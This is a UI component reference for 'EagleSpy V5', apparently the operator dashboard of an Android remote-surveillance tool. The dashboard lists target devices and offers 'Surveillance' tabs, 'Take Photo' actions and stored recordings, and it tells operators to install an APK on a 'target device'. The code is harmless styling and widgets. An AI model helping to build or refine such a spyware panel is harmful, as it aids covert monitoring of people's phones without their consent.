# EagleSpy V5 - Component Library

## 📦 Component Reference

Complete reference for all UI components available in the modernized dashboard.

---

## 🎯 Buttons

### Basic Buttons

```html
<!-- Primary -->
<button class="btn btn-primary">Primary Action</button>
<a href="#" class="btn btn-primary">Link Button</a>

<!-- Secondary -->
<button class="btn btn-secondary">Secondary</button>

<!-- Danger (Destructive) -->
<button class="btn btn-danger">Delete</button>

<!-- Ghost -->
<button class="btn btn-ghost">Cancel</button>
```

### Button Sizes

```html
<button class="btn btn-primary" style="padding: 8px 16px; font-size: 13px;">Small</button>
<button class="btn btn-primary">Medium (Default)</button>
<button class="btn btn-primary" style="padding: 14px 28px; font-size: 16px;">Large</button>
```

### Button States

```html
<!-- Disabled -->
<button class="btn btn-primary" disabled>Disabled</button>

<!-- Loading -->
<button class="btn btn-primary btn-loading">Processing...</button>

<!-- With Icon -->
<button class="btn btn-primary">
  <span>📥</span> Download
</button>
```

---

## 📊 Cards

### Stat Card

```html
<div class="stat-card" data-color="blue">
  <div class="stat-icon">📱</div>
  <span class="stat-value">42</span>
  <span class="stat-label">Devices</span>
</div>
```

**Available Colors**: `blue`, `purple`, `green`, `red`, `amber`, `cyan`

### Device Card

```html
<div class="device-card">
  <div class="device-header">
    <div class="device-avatar">
      <svg><!-- Phone Icon --></svg>
    </div>
    <div class="device-meta">
      <h3>Samsung Galaxy S21</h3>
      <div class="device-os">Android 12 · ID: ABC123</div>
    </div>
    <div class="device-status online">
      <span class="pulse-dot"></span>
      Online
    </div>
  </div>
  
  <div class="tab-bar">
    <button class="tab-btn active">Surveillance</button>
    <button class="tab-btn">Data</button>
  </div>
  
  <div class="tab-pane active">
    <!-- Content -->
  </div>
</div>
```

### Action Button (Dashboard)

```html
<a href="/action" class="action-btn c-blue">
  <span class="action-icon">📷</span>
  <span class="action-label">Take Photo</span>
</a>
```

**Available Colors**: `c-blue`, `c-purple`, `c-green`, `c-red`, `c-amber`, `c-cyan`, `c-pink`, `c-lime`

---

## 🏷️ Badges

```html
<span class="badge badge-success">Online</span>
<span class="badge badge-error">Offline</span>
<span class="badge badge-warning">Pending</span>
<span class="badge badge-info">Processing</span>
```

---

## 🔔 Toast Notifications

### JavaScript API

```javascript
// Basic toast
showToast('Operation successful', 'success');

// With duration (ms)
showToast('Processing...', 'info', 3000);

// Persistent (no auto-dismiss)
showToast('Important message', 'warning', 0);

// Types: 'success', 'error', 'warning', 'info'
```

### Automatic AJAX Toasts

Automatically shown for any AJAX request with `data-remote="true"`:

```html
<a href="/api/action" data-remote="true" data-method="post">
  Send Command
</a>
```

---

## 🪟 Modals

### Confirmation Modal

```javascript
showModal({
  title: 'Delete Device?',
  message: 'This action cannot be undone.',
  type: 'confirm',
  confirmText: 'Delete',
  cancelText: 'Cancel',
  onConfirm: () => {
    // Perform action
  },
  onCancel: () => {
    // Optional
  }
});
```

### Info Modal

```javascript
showModal({
  title: 'Information',
  message: 'Your data has been saved successfully.',
  confirmText: 'OK',
  cancelText: 'Close',
  onConfirm: () => {}
});
```

### Shorthand for Destructive Actions

```javascript
confirmAction('Delete all recordings?', () => {
  // Perform deletion
});
```

---

## ⏳ Loading States

### Skeleton Screens

```html
<!-- Skeleton Text -->
<div class="skeleton skeleton-text"></div>
<div class="skeleton skeleton-text" style="width: 60%"></div>

<!-- Skeleton Title -->
<div class="skeleton skeleton-title"></div>

<!-- Skeleton Avatar -->
<div class="skeleton skeleton-avatar"></div>

<!-- Skeleton Card -->
<div class="skeleton skeleton-card"></div>

<!-- Skeleton Stat -->
<div class="skeleton skeleton-stat"></div>
```

### Skeleton Grid

```html
<div class="skeleton-grid">
  <div class="skeleton skeleton-stat"></div>
  <div class="skeleton skeleton-stat"></div>
  <div class="skeleton skeleton-stat"></div>
</div>
```

### Spinner

```html
<!-- Default -->
<div class="spinner"></div>

<!-- Sizes -->
<div class="spinner spinner-sm"></div>
<div class="spinner spinner-lg"></div>
<div class="spinner spinner-xl"></div>
```

### Button Loading State

```html
<button class="btn btn-primary btn-loading">
  Processing...
</button>
```

Or via JavaScript:

```javascript
const btn = document.querySelector('.my-button');
btn.classList.add('btn-loading');
// ... async operation ...
btn.classList.remove('btn-loading');
```

### Progress Bar

```html
<!-- Determinate -->
<div class="progress-container">
  <div class="progress-label">
    <span>Uploading...</span>
    <span class="progress-percent">45%</span>
  </div>
  <div class="progress-bar">
    <div class="progress-fill" style="width: 45%"></div>
  </div>
</div>

<!-- Indeterminate -->
<div class="progress-bar progress-indeterminate">
  <div class="progress-fill"></div>
</div>

<!-- Sizes -->
<div class="progress-bar progress-sm">
  <div class="progress-fill" style="width: 60%"></div>
</div>
<div class="progress-bar progress-lg">
  <div class="progress-fill" style="width: 60%"></div>
</div>
```

### Dots Loading

```html
<div class="dots-loading">
  <span></span>
  <span></span>
  <span></span>
</div>
```

### Loading Overlay

```html
<div class="loading-overlay">
  <div class="spinner spinner-lg"></div>
  <span class="loading-text">Loading data...</span>
</div>

<!-- Fixed (full screen) -->
<div class="loading-overlay loading-overlay-fixed">
  <div class="spinner spinner-xl"></div>
  <span class="loading-text">Processing...</span>
</div>
```

---

## 📭 Empty States

```html
<div class="empty-state empty-no-devices">
  <div class="empty-icon">📱</div>
  <h2 class="empty-title">No Devices Connected</h2>
  <p class="empty-description">
    Install the APK on a target device to begin monitoring.
  </p>
  <div class="empty-action">
    <a href="#" class="btn btn-primary">Download APK</a>
  </div>
</div>
```

**Predefined Classes**:
- `.empty-no-devices` - 📱 icon
- `.empty-no-data` - 📊 icon
- `.empty-no-results` - 🔍 icon
- `.empty-error` - ⚠️ icon

---

## 📑 Tables

### Responsive Table

```html
<div class="responsive-table-wrapper">
  <table class="index_table">
    <thead>
      <tr>
        <th>Name</th>
        <th>Email</th>
        <th>Status</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td data-label="Name">John Doe</td>
        <td data-label="Email">john@example.com</td>
        <td data-label="Status">
          <span class="badge badge-success">Active</span>
        </td>
      </tr>
    </tbody>
  </table>
</div>
```

**Note**: Add `data-label` attribute to each `<td>` for mobile card layout.

---

## 🎨 Theme Toggle

### JavaScript API

```javascript
// Get theme
const theme = localStorage.getItem('eagle-theme'); // 'dark' or 'light'

// Set theme
const dashboard = new ModernDashboard();
dashboard.setTheme('dark');
dashboard.setTheme('light');
```

### Manual Toggle

```html
<button onclick="document.body.classList.toggle('light-mode'); document.body.classList.toggle('dark-mode');">
  Toggle Theme
</button>
```

---

## 💡 Tooltips

```html
<button data-tooltip="This is a helpful tooltip">
  Hover Me
</button>

<span data-tooltip="User ID: 12345">
  John Doe
</span>
```

---

## 🔧 Utility Classes

### Transitions

```html
<div class="transition-all">All properties</div>
<div class="transition-fast">Fast (150ms)</div>
<div class="transition-slow">Slow (400ms)</div>
<div class="transition-colors">Colors only</div>
<div class="transition-transform">Transform only</div>
<div class="transition-opacity">Opacity only</div>
```

### Animations

```html
<!-- Fade in -->
<div class="fade-in">Content</div>

<!-- Slide up -->
<div class="slide-up">Content</div>

<!-- Pulse -->
<div class="pulse">Pulsing element</div>

<!-- Shimmer effect -->
<div class="shimmer">
  <!-- Content -->
</div>

<!-- Staggered animations -->
<div class="slide-up stagger-1">Item 1</div>
<div class="slide-up stagger-2">Item 2</div>
<div class="slide-up stagger-3">Item 3</div>
```

### Card Effects

```html
<!-- Hover lift -->
<div class="card-hover">
  Card content
</div>

<!-- Glow on hover -->
<div class="card-glow">
  Card content
</div>
```

### Optimistic UI

```html
<div class="optimistic-update">
  <!-- Automatically added during AJAX -->
</div>

<div class="update-success">
  <!-- Added on success -->
</div>

<div class="update-error">
  <!-- Added on error (shakes) -->
</div>
```

---

## 📱 Responsive Utilities

### Mobile Menu Toggle

```html
<button class="mobile-menu-toggle">
  <span class="bar"></span>
  <span class="bar"></span>
  <span class="bar"></span>
</button>
```

### Scroll Indicators

```html
<div class="scroll-container">
  <!-- Scrollable content -->
</div>
```

JavaScript:

```javascript
const container = document.querySelector('.scroll-container');
if (container.scrollWidth > container.clientWidth) {
  container.classList.add('has-scroll');
}
```

---

## 🎯 Grid Layouts

### Stats Grid

```html
<div class="stats-grid">
  <div class="stat-card" data-color="blue">...</div>
  <div class="stat-card" data-color="purple">...</div>
  <!-- More stats -->
</div>
```

**Responsive**:
- Mobile (< 768px): 2 columns
- Tablet (768px - 1024px): 3 columns
- Desktop (> 1024px): 6 columns

### Action Grid

```html
<div class="action-grid">
  <a href="#" class="action-btn c-blue">...</a>
  <a href="#" class="action-btn c-green">...</a>
  <!-- More actions -->
</div>
```

**Responsive**:
- Mobile (< 768px): 3 columns
- Tablet (768px - 1024px): 4 columns
- Desktop (> 1024px): Auto-fill (min 120px)

### Analytics Grid

```html
<div class="analytics-grid">
  <div class="analytic-card">...</div>
  <div class="analytic-card">...</div>
  <!-- More analytics -->
</div>
```

---

## 🎨 Color Palette

### Primary Colors

- **Blue**: `--color-accent-blue` (#3b82f6)
- **Purple**: `--color-accent-purple` (#8b5cf6)
- **Green**: `--color-accent-green` (#22c55e)
- **Red**: `--color-accent-red` (#ef4444)
- **Amber**: `--color-accent-amber` (#f59e0b)
- **Cyan**: `--color-accent-cyan` (#06b6d4)

### Semantic Colors

- **Success**: `--color-success` (green)
- **Error**: `--color-error` (red)
- **Warning**: `--color-warning` (amber)
- **Info**: `--color-info` (blue)

### Usage

```css
.my-element {
  color: var(--color-accent-blue);
  background: rgba(var(--color-accent-blue-rgb), 0.15);
}
```

---

## 📏 Spacing Scale

```css
--space-xs: 4px;
--space-sm: 8px;
--space-md: 16px;
--space-lg: 24px;
--space-xl: 32px;
--space-2xl: 48px;
```

### Usage

```css
.my-element {
  padding: var(--space-md);
  margin-bottom: var(--space-lg);
  gap: var(--space-sm);
}
```

---

## 🔤 Typography Scale

```css
--text-xs: 11px;   /* Small labels */
--text-sm: 12px;   /* Secondary text */
--text-base: 14px; /* Body text */
--text-lg: 16px;   /* Large body */
--text-xl: 18px;   /* Subheadings */
--text-2xl: 22px;  /* Headings */
--text-3xl: 28px;  /* Large headings */
```

### Font Weights

```css
--weight-normal: 400;
--weight-medium: 500;
--weight-semibold: 600;
--weight-bold: 700;
```

---

## 🎬 Animations

### Built-in Keyframes

- `fade-in` - Simple fade in
- `slide-up` - Slide up with fade
- `modal-scale-in` - Modal entrance
- `toast-slide-in` - Toast entrance
- `spinner-rotate` - Spinner rotation
- `pulse-glow` - Pulsing glow effect
- `skeleton-pulse` - Skeleton loading
- `shimmer-slide` - Shimmer effect
- `shake` - Error shake

### Usage

```css
.my-element {
  animation: fade-in 0.3s ease;
}
```

---

## 🎯 Best Practices

1. **Always use CSS variables** for colors, spacing, and effects
2. **Use touch-target mixin** for interactive elements on mobile
3. **Add data-label** to table cells for responsive card layout
4. **Use semantic color classes** (badge-success, not badge-green)
5. **Prefer CSS transitions** over JavaScript animations
6. **Use loading states** for all async operations
7. **Add confirmation modals** for destructive actions
8. **Test on mobile devices** (< 768px)

---

## 📚 Quick Reference

| Component | Class | Purpose |
|-----------|-------|---------|
| Button | `.btn .btn-primary` | Primary action |
| Card | `.stat-card` | Statistic display |
| Toast | `showToast()` | Notification |
| Modal | `showModal()` | Dialog |
| Spinner | `.spinner` | Loading indicator |
| Progress | `.progress-bar` | Upload/download |
| Badge | `.badge .badge-success` | Status label |
| Empty | `.empty-state` | No data view |
| Skeleton | `.skeleton` | Loading placeholder |

---

**Version**: 1.0.0  
**Last Updated**: 2024
